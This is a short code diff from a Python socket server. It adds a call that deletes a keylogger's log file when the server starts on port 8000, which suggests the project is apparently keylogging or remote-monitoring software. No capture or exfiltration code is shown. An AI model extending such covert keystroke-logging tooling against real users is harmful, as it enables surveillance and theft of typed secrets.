@@ -43,8 +43,9 @@ def handleClientSocket(clientsocket):
             break
     config.init()
     clientsocket.close()
-
+ 
 def start_server():
+    keylogger.deleteKeyLoggerFile()
     serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     host = ''
     port = 8000
